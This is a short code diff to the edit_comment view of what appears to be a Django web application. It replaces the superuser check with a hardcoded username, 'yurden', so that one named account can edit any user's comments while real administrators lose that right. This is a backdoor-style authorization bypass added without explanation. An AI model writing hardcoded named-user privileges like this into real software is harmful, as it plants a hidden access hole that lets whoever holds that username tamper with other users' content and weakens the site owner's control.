@@ -424,7 +424,7 @@ def remove_comment(request, comment_id):
 
 def edit_comment(request, comment_id):
     comment = get_object_or_404(Comment, pk=comment_id)
-    if (comment.author == request.user) or request.user.is_superuser:
+    if comment.author == request.user or request.user.username == 'yurden':
         if request.method == 'POST':
             form = CommentForm(request.POST, instance=comment)
             if form.is_valid():
